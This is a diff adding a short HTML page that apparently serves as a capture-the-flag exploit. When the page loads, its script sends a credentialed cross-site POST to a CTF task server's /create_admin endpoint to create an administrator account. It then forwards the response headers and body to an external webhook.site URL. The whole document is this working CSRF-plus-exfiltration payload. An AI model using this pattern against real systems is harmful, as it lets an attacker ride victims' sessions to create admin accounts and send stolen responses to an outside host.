@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>
+        fetch('http://tasks.goidactf.ru:20309/create_admin', {
+  method: 'POST',
+  credentials: 'include',
+    body: new URLSearchParams({
+    'new_admin_login': '123'
+  })
+})
+.then(res => {
+  // Получаем заголовки (если разрешены CORS)
+  let headers = [];
+  for (let [k, v] of res.headers.entries()) {
+    headers.push(k + ': ' + v);
+  }
+  return res.text().then(body => ({ headers, body }));
+})
+.then(data => {
+  fetch('https://webhook.site/d7a1179b-eb8b-4901-801d-0afbed2f3741', {
+    method: 'POST',
+    body: JSON.stringify(data),
+    headers: { 'Content-Type': 'application/json' }
+  });
+});
+    </script>
+</body>
+</html>
